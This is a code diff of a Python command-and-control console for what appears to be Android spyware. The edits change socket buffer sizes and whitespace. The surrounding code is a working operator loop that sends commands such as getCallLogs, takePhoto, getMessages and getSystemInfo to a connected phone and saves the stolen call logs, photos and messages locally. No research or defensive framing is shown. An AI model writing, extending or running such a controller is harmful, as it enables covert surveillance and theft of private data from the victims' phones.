@@ -17,7 +17,7 @@ print("Listening for connections on " + str(server_soc))
 
 conn, addr = server_soc.accept()
 print("Connection from " + str(addr))
-connectionTest = conn.recv(1024).decode("UTF-8")
+connectionTest = conn.recv(4048).decode("UTF-8")
 print("From " + str(addr) + " : " + str(connectionTest))
 
 # Just some function to be used here and there
@@ -25,10 +25,10 @@ def recvall(sock):
     data = ""
     buffer = ""
     while END_HEADER not in data:
-        buffer = sock.recv(1024).decode("UTF-8", "ignore")
+        buffer = sock.recv(4048).decode("UTF-8", "ignore")
         data += buffer
-    data.replace(END_HEADER, "")    
-    return data   
+    data.replace(END_HEADER, "")
+    return data
 
 while True:
     dataSend = input(">>>") + "\n"
@@ -38,11 +38,11 @@ while True:
         conn.send(dataSend.encode("UTF-8"))
         conn.close()
         break
-    
+
     elif dataSend.strip() == "getCallLogs":
         conn.send(dataSend.encode("utf-8"))
         print(str(recvall(conn)))
-    
+
     elif dataSend.strip() == "takePhoto":
         conn.send(dataSend.encode("utf-8"))
         file = open("Photo" + str(datetime.datetime.now()) + ".png", "wb")
@@ -60,7 +60,7 @@ while True:
     elif dataSend.strip() == "getSystemInfo":
         conn.send(dataSend.encode("UTF-8"))
         print("System Info of " + str(addr) + "\n" + str(recvall(conn)))
-    
+
     elif dataSend.strip() == "getMessages":
         conn.send(dataSend.encode("UTF-8"))
         print("Writing it to messages.txt")
@@ -76,8 +76,8 @@ while True:
         print(str(recvall(conn)))
 #        //TODO Needs a fix on Android Code.
 
-    else:    
+    else:
         conn.send(dataSend.encode("utf-8"))
-        print(conn.recv(1024).decode("utf-8"))
+        print(conn.recv(4048).decode("utf-8"))
 
 conn.close()
